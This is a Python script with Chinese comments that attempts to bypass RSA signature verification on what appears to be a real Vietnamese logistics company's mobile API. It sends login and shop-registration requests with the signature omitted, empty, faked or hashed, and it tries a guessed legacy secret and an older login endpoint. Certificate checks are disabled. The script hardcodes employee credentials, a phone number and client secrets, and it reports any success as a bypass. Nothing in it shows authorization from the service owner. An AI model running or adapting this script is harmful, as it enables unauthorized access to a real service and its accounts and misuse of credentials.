#!/usr/bin/env python3
"""
测试EMSONE API签名绕过
尝试各种方法避开RSA签名验证
"""

import requests
import json
import urllib3
import base64
import hashlib
urllib3.disable_warnings()

BASE_URL = "https://gwmobile.emsone.com.vn"

def test_case(name, headers, data, description):
    """测试用例"""
    print(f"\n{'='*70}")
    print(f"[测试] {name}")
    print(f"{'='*70}")
    print(f"描述: {description}")
    
    try:
        r = requests.post(
            f"{BASE_URL}/execute",
            json=data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        result = r.json()
        code = result.get('Code')
        message = result.get('Message')
        
        print(f"\nHTTP {r.status_code}")
        print(f"Code: {code}")
        print(f"Message: {message}")
        
        if code == '00':
            print("\n✅✅✅ 成功！签名绕过成功！")
            print(json.dumps(result, indent=2, ensure_ascii=False))
            return True
        elif code == '01':
            print("\n✅ 接口可用！（但登录失败，可能是账号密码错误）")
            return True
        elif code == '95':
            print("\n❌ 签名验证失败")
        elif code == '97':
            print("\n❌ 需要Token（不太可能）")
        else:
            print(f"\n⚠️ 其他错误")
            
        return False
        
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        return False

# 基础数据
login_data = {
    "phone": "difoco",
    "password": "43824893"
}

register_data = {
    "mobileNumber": "0999999999",
    "fullName": "Test User",
    "email": "test@test.com",
    "address": "Test Address",
    "storeName": "Test Store",
}

# ================================================================
# 测试用例
# ================================================================

print("="*70)
print(" EMSONE API 签名绕过测试")
print("="*70)

# 测试1：完全省略签名和公钥
test_case(
    "1. 省略签名Headers",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'platform': 'android',
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data),
        "signature": ""
    },
    "完全不包含signature和public_key headers"
)

# 测试2：空签名
test_case(
    "2. 空签名",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'signature': '',
        'public_key': '',
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data),
        "signature": ""
    },
    "空字符串签名"
)

# 测试3：假签名
test_case(
    "3. 假签名（固定字符串）",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'signature': 'fake_signature_12345',
        'public_key': 'fake_public_key_67890',
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data),
        "signature": ""
    },
    "使用假的签名字符串"
)

# 测试4：Base64编码的假签名
fake_sig = base64.b64encode(b"fake_signature").decode()
fake_key = base64.b64encode(b"fake_public_key").decode()

test_case(
    "4. Base64编码的假签名",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'signature': fake_sig,
        'public_key': fake_key,
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data),
        "signature": ""
    },
    "Base64编码的假签名"
)

# 测试5：SHA256哈希作为签名
sign_str = "EMPLOYEE_LOGIN_V2 | " + json.dumps(login_data) + " | ANDROID | "
sha256_sig = hashlib.sha256(sign_str.encode()).hexdigest()

test_case(
    "5. SHA256哈希作为签名",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'signature': sha256_sig,
        'public_key': 'test',
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data),
        "signature": ""
    },
    "使用简单SHA256哈希"
)

# 测试6：测试注册接口
test_case(
    "6. 注册接口（省略签名）",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
    },
    {
        "channel": "ANDROID",
        "code": "SHOP_REGISTER",
        "data": json.dumps(register_data),
        "signature": ""
    },
    "测试注册接口是否需要签名"
)

# 测试7：尝试使用旧的简单签名方式（Ems@2021）
old_sign_str = json.dumps(login_data) + "Ems@2021"
old_sig = hashlib.sha256(old_sign_str.encode()).hexdigest()

test_case(
    "7. 旧版签名方式（Ems@2021）",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'signature': old_sig,
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data),
        "signature": ""
    },
    "尝试旧版SHA256+密钥签名"
)

# 测试8：尝试其他登录命令代码
test_case(
    "8. 测试其他登录命令（EMPLOYEE_LOGIN）",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN",  # V1版本？
        "data": json.dumps(login_data),
        "signature": ""
    },
    "测试是否有不需要签名的旧版登录接口"
)

# 测试9：使用手机号格式
login_data_phone = {
    "phone": "0764955842",  # 之前提供的越南手机号
    "password": "test123"
}

test_case(
    "9. 测试越南手机号格式",
    {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
    },
    {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps(login_data_phone),
        "signature": ""
    },
    "尝试不同的手机号格式"
)

print("\n" + "="*70)
print(" 测试完成！")
print("="*70)
print("""
结果分析：
- 如果有任何测试返回 Code 00 或 Code 01 → 签名可绕过！✅
- 如果全部返回 Code 95 → 必须有有效RSA签名 ❌
- 如果有返回 Code 97 → 该端点仍需Token
""")
